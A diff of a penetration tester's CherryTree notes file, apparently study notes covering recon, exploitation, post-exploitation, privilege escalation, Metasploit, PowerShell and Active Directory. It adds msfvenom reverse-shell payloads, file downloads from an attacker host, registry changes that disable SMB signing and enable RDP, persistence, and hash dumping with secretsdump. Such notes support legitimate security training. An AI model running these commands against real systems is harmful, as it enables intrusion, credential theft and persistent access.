@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1639344443">
+  <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1643622334">
     <rich_text>Close port
 sudo kill $(sudo lsof -t -i:445)</rich_text>
-    <node name="Recon &amp; Enumeration" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344321" ts_lastsave="1642417039">
+    <node name="Recon &amp; Enumeration" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344321" ts_lastsave="1643486307">
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Port Scanning</rich_text>
       <rich_text>
 
@@ -85,7 +85,7 @@ ls /usr/share/nmap/scripts/ | grep ‘&lt;desired_script/service&gt;’
 </rich_text>
       <rich_text weight="heavy">Windows batch loop</rich_text>
       <rich_text>
-• FOR /L %X IN (1,1,254) do @PING -i 3 -w 1 -n 1 192.168.%x.1 | FIND "bytes="
+• for /l %i in (1,1,254) do ping -n 1 10.185.11.%i -w 10 | find /i "Reply from"
 
 </rich_text>
       <rich_text weight="heavy">Linux bash loop</rich_text>
@@ -142,6 +142,7 @@ snmpwalk -c &lt;community_string&gt; -v1 &lt;host&gt; hrSWInstalledName
 </rich_text>
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">SMB</rich_text>
       <rich_text>
+
 nmap -sC --script=smb-enum-users 192.168.201.14
 nmap --script smb-os-discovery -p 445 &lt;ip_address&gt;
 
@@ -237,7 +238,7 @@ hydra -l "" -P /usr/share/dirb/wordlists/big.txt 192.168.174.10 http-post-form "
 
 </rich_text>
     </node>
-    <node name="Exploitation" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344165" ts_lastsave="1641421201">
+    <node name="Exploitation" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344165" ts_lastsave="1642766817">
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Buffer Overflows</rich_text>
       <rich_text>
 
@@ -287,7 +288,7 @@ generic_send_tcp &lt;HOST&gt; &lt;PORT&gt; trun.spk 0 0
       <rich_text weight="heavy">Generate ShellCode</rich_text>
       <rich_text>
 • msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=X -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload
-• msfvenom -p linux/x86/shell_reverse_tcp LHOST=X LPORT=X EXITFUNC=thread -b "\x00" -f c</rich_text>
+• msfvenom -p linux/x86/shell_reverse_tcp LHOST=X LPORT=X EXITFUNC=thread -b "\x00" -f python -v payload</rich_text>
       <rich_text justification="center" style="italic">
 </rich_text>
       <rich_text>
@@ -528,7 +529,7 @@ Executing shell commands
 • SELECT sys_exec('&lt;command&gt;');
 • sqlmap --os-cmd --os-shell</rich_text>
     </node>
-    <node name="Post-exploitation" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344266" ts_lastsave="1642503207">
+    <node name="Post-exploitation" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344266" ts_lastsave="1643025052">
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">SQL Related</rich_text>
       <rich_text>
 
@@ -539,6 +540,10 @@ update &lt;table&gt;
 set &lt;item&gt;='new_content' where &lt;item&gt;='item';
 set pwd='admin' where login='admin';
 
+</rich_text>
+      <rich_text weight="heavy">Add items to table</rich_text>
+      <rich_text>
+• insert into &lt;table&gt; (&lt;item1&gt;, &lt;item2&gt;) values ('&lt;value1&gt;','&lt;value2&gt;');
 
 
 </rich_text>
@@ -565,6 +570,14 @@ set pwd='admin' where login='admin';
 
 Tunneling
 • ssh -D &lt;port&gt; user@ssh_server -fN
+
+Double Tunnelling
+
+From the first compromised machine
+• ssh -f -N -D 127.0.0.1:9999 user@2ndmachine
+
+Add entry on proxychains
+• socks4 127.0.0.1 9999
 
 Port Forwarding
 • ssh -L &lt;lport&gt;:&lt;rhost&gt;:&lt;rport&gt; user@ssh_server
@@ -780,9 +793,27 @@ Decode &amp; Extract
 • </rich_text>
       <rich_text foreground="#e8e6e3">fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt </rich_text>
       <rich_text>file.zip</rich_text>
-      <node name="Windows" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394468" ts_lastsave="1642416620">
-        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Useful Stuff</rich_text>
+      <node name="Windows" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394468" ts_lastsave="1643713434">
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">General</rich_text>
         <rich_text>
+
+Setup OpenSSH server
+• powershell.exe -ExecutionPolicy Bypass -File &lt;install-ssh.ps1_path&gt;
+
+On services.msc
+• Locate OpenSSH Server
+• Properties -&gt; Startup type: Automatic
+• Apply &amp; Start the service
+
+Enable service port on firewall
+• netsh advfirewall firewall add rule name="SSH" dir=in action=allow protocol=TCP localport=22
+
+</rich_text>
+        <rich_text weight="heavy">Firewall</rich_text>
+        <rich_text>
+
+Allow service port
+• netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
 
 </rich_text>
         <rich_text weight="heavy">CMD Commands</rich_text>
@@ -840,7 +871,7 @@ HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters
         <rich_text style="italic">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</rich_text>
         <rich_text>
 • </rich_text>
-        <rich_text style="italic">reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f</rich_text>
+        <rich_text style="italic">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f</rich_text>
         <rich_text>
 
 </rich_text>
@@ -866,6 +897,12 @@ xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;host&gt;
 </rich_text>
         <rich_text weight="heavy">RDP</rich_text>
         <rich_text>
+
+Enable the service
+• run getgui -e
+• reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
 • xfreerdp "/v:&lt;HOST&gt;" "/u:&lt;USER&gt;" /drive:tmp,/tmp
 • Remmina: Share Folder
 
@@ -1008,7 +1045,16 @@ Upload Payload+Bypass files
 
 
 </rich_text>
-        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">CrackMapExec</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Impacket</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text weight="heavy">PSExec</rich_text>
+        <rich_text>
+• psexec.py &lt;user&gt;@&lt;server&gt;
+
+</rich_text>
+        <rich_text weight="heavy">CrackMapExec</rich_text>
         <rich_text>
 
 Test credentials
@@ -1021,7 +1067,7 @@ Test credentials
 
 • evil-winrm -i &lt;domain&gt; -u &lt;user&gt; -p '&lt;password&gt;'</rich_text>
       </node>
-      <node name="Linux" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394471" ts_lastsave="1640981216">
+      <node name="Linux" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394471" ts_lastsave="1643225954">
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Restricted Shells</rich_text>
         <rich_text>
 
@@ -1086,6 +1132,11 @@ With root access in the compromised machine:
 </rich_text>
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Maintaining Access &amp; Persistence</rich_text>
         <rich_text>
+
+</rich_text>
+        <rich_text weight="heavy">Change password one-liner</rich_text>
+        <rich_text>
+• echo "&lt;user&gt;:&lt;pass&gt;" | chpasswd
 
 </rich_text>
         <rich_text weight="heavy">OpenSSL Reverse Shell</rich_text>
@@ -1174,7 +1225,22 @@ WantedBy = multi-user.target</rich_text>
 • netstat -auntp | grep 56825
 
 On the attacker machine, just connect back to the target:
-• nc &lt;target_ip&gt; 56825</rich_text>
+• nc &lt;target_ip&gt; 56825
+
+
+</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">File Transfer</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text weight="heavy">Wget</rich_text>
+        <rich_text>
+• wget http://&lt;attacker_ip&gt;:8000/file
+
+</rich_text>
+        <rich_text weight="heavy">cURL</rich_text>
+        <rich_text>
+• curl http://&lt;attacker_ip&gt;:8000/file -o file &amp;&amp; chmod</rich_text>
       </node>
     </node>
     <node name="Privilege Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344338" ts_lastsave="1639344356">
@@ -1376,7 +1442,7 @@ Spawn a command prompt
 List any saved credentials
 • cmdkey /list</rich_text>
       </node>
-      <node name="Linux" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344352" ts_lastsave="1642259906">
+      <node name="Linux" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344352" ts_lastsave="1643303203">
         <rich_text weight="heavy">Good for guidance</rich_text>
         <rich_text>
 </rich_text>
@@ -1399,6 +1465,7 @@ List any saved credentials
 • Ubuntu 12 = DirtyCow!
 • FreeBSD 9.0 = 2 exploits
 
+• pkexec
 
 • sudo -l
 • Kernel Version [uname -r]
@@ -1414,6 +1481,7 @@ List any saved credentials
    ◇ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
    ◇ also copy only the passwd file, no need for the shadow one
 • pspy and ps aux may have something
+
 
 </rich_text>
         <rich_text weight="heavy">Find command</rich_text>
@@ -1560,7 +1628,7 @@ Similar to DDL Hijacking on Windows systems, when a linux application is execute
 • msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=X LPORT=X -f elf-so -o program.so</rich_text>
       </node>
     </node>
-    <node name="Metasploit" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344196" ts_lastsave="1640129370">
+    <node name="Metasploit" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344196" ts_lastsave="1642791076">
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Meterpreter</rich_text>
       <rich_text>
 
@@ -1697,12 +1765,173 @@ exploit -j
       <rich_text weight="heavy">Windows</rich_text>
       <rich_text>
 
-Reverse_TCP
-</rich_text>
+Reverse TCP
+• </rich_text>
       <rich_text foreground="#e8e6e3">msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=X -f exe &gt; </rich_text>
       <rich_text>X.exe
 
-msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;$LOCAL_IP&gt; LPORT=&lt;$LOCAL_PORT&gt; -f raw -o shell.php</rich_text>
+Bind TCP
+
+</rich_text>
+      <rich_text weight="heavy">Linux</rich_text>
+      <rich_text>
+
+Reverse TCP
+• msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X LPORT=X -f elf &gt; back.elf
+
+</rich_text>
+      <rich_text weight="heavy">PHP</rich_text>
+      <rich_text>
+
+• msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;$LOCAL_IP&gt; LPORT=&lt;$LOCAL_PORT&gt; -f raw -o shell.php</rich_text>
+    </node>
+    <node name="Powershell" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643622334" ts_lastsave="1643715930">
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">General</rich_text>
+      <rich_text>
+
+Check architecture
+• [Environment]::Is64BitProcess
+
+Execution Policy
+• -ExecutionPolicy Bypass &lt;script&gt;
+• -ExecutionPolicy Unrestricted &lt;script&gt;
+
+Hide Powershell window
+• -WindowStyle Hidden &lt;script&gt;
+
+Specify commands &amp; script blocks
+• -Command Get-Process
+• -Command "&amp; { Get-EventLog -LogName security }"
+
+Execute Base64 encoded
+• -EncodedCommand &lt;b64_command&gt;
+
+Don't load profiles
+• -NoProfile &lt;script&gt;
+
+Version manipulation
+• -Version &lt;version&gt;
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Abbreviation</rich_text>
+      <rich_text>
+
+ExecutionPolicy Bypass
+• -ep Bypass
+• -ex by
+
+EncodedCommand
+• -enco
+• -ec
+
+WindowsStyle Hidden
+• -W h
+• -Wi hi
+
+Manual &amp; Help
+• Get-Help &lt;command&gt;
+   ◇ -Full to include detailed info
+   ◇ -Examples to display usage
+
+• Get-Command -Name *&lt;string&gt;*
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Pipelining</rich_text>
+      <rich_text>
+
+• Get-Process | Sort-Object -Unique | Select-Object ProcessName &gt; output.txt
+• Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path
+• | Export-Csv C:\file.csv
+• Select-String -Path C:\&lt;path&gt;\*.txt -Pattern pass*
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Information Gathering</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Processes</rich_text>
+      <rich_text>
+
+Path
+• Get-Process &lt;process&gt; | Sort-Object -Unique | Format-List Path
+
+PID
+• Get-Process &lt;process&gt; | Sort-Object -Unique | Format-List Id
+
+</rich_text>
+      <rich_text weight="heavy">OS</rich_text>
+      <rich_text>
+
+• Get-WmiObject -class win32_operatingsystem | select -Property *
+
+</rich_text>
+      <rich_text weight="heavy">Registry</rich_text>
+      <rich_text>
+
+• cd HKLM:\
+
+</rich_text>
+      <rich_text weight="heavy">Services</rich_text>
+      <rich_text>
+
+• Get-Service "&lt;service&gt;" | Sort-Object Status -Descending
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Modules</rich_text>
+      <rich_text>
+
+Import modules
+• Import-Module .\module.psm1
+
+Check Module Paths
+• $Env:PSModulePath
+
+List module commands &amp; usage
+• Get-Command -Module &lt;module&gt;
+   ◇ Get-Help &lt;command&gt;
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Loop Statements</rich_text>
+      <rich_text>
+
+• for
+• foreach
+• while
+• do while
+• do until
+
+</rich_text>
+      <rich_text style="italic">$services = Get-Service
+foreach ($service in $services) {  $service.name }</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text style="italic">Get-Service | ForEach-Object {$_.Name}</rich_text>
+      <rich_text>
+
+
+</rich_text>
+      <rich_text weight="heavy">Objects</rich_text>
+      <rich_text>
+
+List process methods
+• Get-Process | Get-Member -MemberType Method
+
+Using methods against processes
+• Get-Process -Name "&lt;process&gt;" | &lt;method&gt;</rich_text>
+      <node name="One-liners" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643713463" ts_lastsave="1643714916">
+        <rich_text weight="heavy">Port Scanner</rich_text>
+        <rich_text>
+
+$ports=(22,80,8000); $ip="localhost"; foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch{}; if ($socket -eq $null){}else{Write-Host "[+] Port"$port" open"; $socket = $null;}}
+
+</rich_text>
+      </node>
     </node>
     <node name="Active Directory" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344242" ts_lastsave="1640812758">
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">AS-Rep Roasting</rich_text>
@@ -1763,7 +1992,7 @@ set srvhost, target 2, payload, lhost, lport, exitonsession, exploit -j
       <rich_text weight="heavy">Meterpreter</rich_text>
       <rich_text>
 • load extapi</rich_text>
-      <node name="Enumeration" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1640812758" ts_lastsave="1642363201">
+      <node name="Enumeration" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1640812758" ts_lastsave="1643489053">
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Credential Harvesting</rich_text>
         <rich_text>
 
@@ -1784,7 +2013,21 @@ Active Directory policies are stored in the UNC path %USERDNSDOMAIN%\Policies, h
 </rich_text>
         <rich_text weight="heavy">Decrypt credentials</rich_text>
         <rich_text>
-• gpp &lt;hash&gt;</rich_text>
+• gpp &lt;hash&gt;
+
+
+</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Domain</rich_text>
+        <rich_text>
+
+Enumerate users via SMB
+• lookupsid.py &lt;user&gt;@&lt;host&gt; 
+
+Filter users without Kerberos pre-auth
+• GetNPUsers.py -dc-ip &lt;host&gt; -usersfile &lt;file&gt; -no-pass &lt;domain&gt;/
+
+Dump hashes
+• secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;host&gt;</rich_text>
       </node>
     </node>
   </node>
